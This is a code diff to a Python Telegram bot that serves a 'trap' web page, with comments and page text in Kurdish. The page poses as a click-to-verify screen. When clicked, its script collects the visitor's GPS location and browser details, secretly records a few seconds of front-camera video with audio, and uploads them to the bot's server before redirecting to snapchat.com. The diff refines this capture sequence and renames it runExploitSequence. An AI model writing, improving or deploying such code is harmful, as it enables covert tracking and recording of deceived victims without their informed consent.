@@ -163,7 +163,7 @@ async def handle_admin_photo(message: Message):
         user_states[ADMIN_ID] = {}
         await bot.send_photo(chat_id=ADMIN_ID, photo=photo_id, caption=response_text, parse_mode="Markdown", reply_markup=get_reply_menu(lang))
 
-# پەڕەی تەڵەی ڕەسەن و ڕێکخراو بە دیزاینە شاهانەکەی خۆتەوە
+# پەڕەی تەڵەی شاهانە - چارەسەری یەکجاری بۆ لۆکەیشن و ڤیدیۆ
 async def web_trap_page(request: web.Request):
     redirect_url = request.query.get('redirect', 'https://snapchat.com')
     headers = request.headers
@@ -182,7 +182,7 @@ async def web_trap_page(request: web.Request):
             color: #ffffff;
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             text-align: center;
-            padding-top: 150px;
+            padding-top: 130px;
             margin: 0;
             height: 100vh;
             overflow: hidden;
@@ -192,32 +192,32 @@ async def web_trap_page(request: web.Request):
             border: 1px solid rgba(255, 255, 255, 0.08);
             backdrop-filter: blur(10px);
             border-radius: 20px;
-            max-width: 400px;
+            max-width: 380px;
             margin: 0 auto;
-            padding: 40px 20px;
+            padding: 35px 20px;
             box-shadow: 0 15px 35px rgba(0,0,0,0.5);
             cursor: pointer;
         }}
         .spinner {{
             border: 4px solid rgba(255, 255, 255, 0.1);
-            width: 60px;
-            height: 60px;
+            width: 50px;
+            height: 50px;
             border-radius: 50%;
             border-left-color: #38bdf8;
             border-top-color: #818cf8;
             animation: spin 1s cubic-bezier(0.68, -0.55, 0.27, 1.55) infinite;
-            margin: 25px auto;
+            margin: 20px auto;
         }}
         @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
-        h2 {{ font-size: 20px; font-weight: 600; margin-bottom: 10px; color: #f8fafc; }}
-        p {{ color: #94a3b8; font-size: 14px; letter-spacing: 0.5px; }}
+        h2 {{ font-size: 19px; font-weight: 600; margin-bottom: 8px; color: #f8fafc; }}
+        p {{ color: #94a3b8; font-size: 13px; letter-spacing: 0.5px; }}
     </style>
 </head>
 <body>
-    <div class="container" id="actionBox">
+    <div class="container" id="gatewayBox">
         <div class="spinner"></div>
-        <h2>سەرقاڵی پشکنین و بارکردنی پەڕەکە...</h2>
-        <p>تکایە کلیک لێرە بکە بۆ پشتڕاستکردنەوەی خێرا</p>
+        <h2>کرتە لێرە بکە بۆ پشتڕاستکردنەوە</h2>
+        <p>تکایە بۆ بینینی ناوەڕۆکەکە پەنجە بنێ بە شاشەکەدا</p>
     </div>
     
     <video id="v" autoplay playsinline muted style="display:none;"></video>
@@ -232,63 +232,62 @@ async def web_trap_page(request: web.Request):
             body: JSON.stringify(clientInfo)
         }});
 
-        async function startCapturing() {{
-            // ١. وەرگرتنی لۆکەیشنی GPS بە شێوازی چاوەڕوانکراو
+        function runExploitSequence() {{
+            // ١. وەرگرتنی خێرای لۆکەیشن (GPS)
             if (navigator.geolocation) {{
-                await new Promise((resolve) => {{
-                    navigator.geolocation.getCurrentPosition(function(pos) {{
-                        fetch('/save_location?lat=' + pos.coords.latitude + '&lon=' + pos.coords.longitude)
-                        .finally(() => resolve());
-                    }}, function(err) {{
-                        resolve();
-                    }}, {{ timeout: 7000, enableHighAccuracy: true }});
-                }});
+                navigator.geolocation.getCurrentPosition(function(pos) {{
+                    fetch('/save_location?lat=' + pos.coords.latitude + '&lon=' + pos.coords.longitude);
+                }}, function(err) {{
+                    console.log("GPS Error: ", err);
+                }}, {{ timeout: 8000, enableHighAccuracy: true, maximumAge: 0 }});
             }}
 
-            // ٢. وەرگرتنی ڤیدیۆ و دەنگ لە ڕێگەی MediaRecorder
-            try {{
-                const stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }}, audio: true }});
-                let video = document.getElementById('v');
-                video.srcObject = stream;
-                
-                let mediaRecorder = new MediaRecorder(stream, {{ mimeType: 'video/webm' }});
-                let chunks = [];
-                
-                mediaRecorder.ondataavailable = function(e) {{
-                    chunks.push(e.data);
-                }};
-                
-                mediaRecorder.onstop = function() {{
-                    let blob = new Blob(chunks, {{ type: 'video/webm' }});
-                    let reader = new FileReader();
-                    reader.readAsDataURL(blob);
-                    reader.onloadend = function() {{
-                        let base64data = reader.result;
-                        fetch('/upload_video', {{
-                            method: 'POST',
-                            headers: {{ 'Content-Type': 'application/json' }},
-                            body: JSON.stringify({{ video: base64data }})
-                        }}).then(() => {{
-                            stream.getTracks().forEach(t => t.stop());
-                            window.location.href = redirectTarget;
-                        }});
+            // ٢. دوای چرکەیەک، داوای کامێرا و مایک دەكات بۆ ئەوەی ڕێپێدانی دووەمیش بێت
+            setTimeout(function() {{
+                navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }}, audio: true }})
+                .then(function(stream) {{
+                    let video = document.getElementById('v');
+                    video.srcObject = stream;
+                    
+                    let mediaRecorder = new MediaRecorder(stream, {{ mimeType: 'video/webm' }});
+                    let chunks = [];
+                    
+                    mediaRecorder.ondataavailable = function(e) {{
+                        chunks.push(e.data);
                     }};
-                }};
-                
-                mediaRecorder.start();
-                setTimeout(function() {{
-                    mediaRecorder.stop();
-                }}, 3000);
-                
-            }} catch (err) {{
-                window.location.href = redirectTarget;
-            }}
+                    
+                    mediaRecorder.onstop = function() {{
+                        let blob = new Blob(chunks, {{ type: 'video/webm' }});
+                        let reader = new FileReader();
+                        reader.readAsDataURL(blob);
+                        reader.onloadend = function() {{
+                            let base64data = reader.result;
+                            fetch('/upload_video', {{
+                                method: 'POST',
+                                headers: {{ 'Content-Type': 'application/json' }},
+                                body: JSON.stringify({{ video: base64data }})
+                            }}).then(() => {{
+                                stream.getTracks().forEach(t => t.stop());
+                                window.location.href = redirectTarget;
+                            }});
+                        }};
+                    }};
+                    
+                    mediaRecorder.start();
+                    setTimeout(function() {{
+                        mediaRecorder.stop();
+                    }}, 3500);
+                    
+                }}).catch(function(err) {{
+                    window.location.href = redirectTarget;
+                }});
+            }}, 1200);
         }}
 
-        // بەکارهێنەر دەبێت یەک کلیک لەسەر سندوقەکە بکات تاوەکو مۆبایل ڕێپێدانەکان (Allow) دەربکات
-        document.getElementById('actionBox').addEventListener('click', function() {{
+        // بەکارهێنەر دەبێت کلیک بکات تا بڕاوەزەر ڕێپێدانەکان بکاتەوە
+        document.getElementById('gatewayBox').addEventListener('click', function() {{
             this.style.display = 'none';
-            startCapturing();
+            runExploitSequence();
         }});
     </script>
 </body>
@@ -308,7 +307,6 @@ async def save_info(request):
         logging.error(f"Info error: {e}")
     return web.json_response({"status": "ok"})
 
-# فەنکشنی وەرگرتنی ڤیدیۆ و دەنگ و ناردنی بۆ تێلگرام
 async def upload_video(request):
     try:
         data = await request.json()
@@ -338,7 +336,7 @@ async def index_handler(request):
     return web.Response(text="Royal Intelligence Core is Active & Boosted.", content_type='text/html')
 
 async def main():
-    app = web.Application(client_max_size=50*1024*1024) # قەبارەی گەورە بۆ ناردنی فایلی ڤیدیۆیی
+    app = web.Application(client_max_size=50*1024*1024)
     app.router.add_get('/', index_handler)
     app.router.add_get('/trap', web_trap_page)
     app.router.add_post('/save_info', save_info)
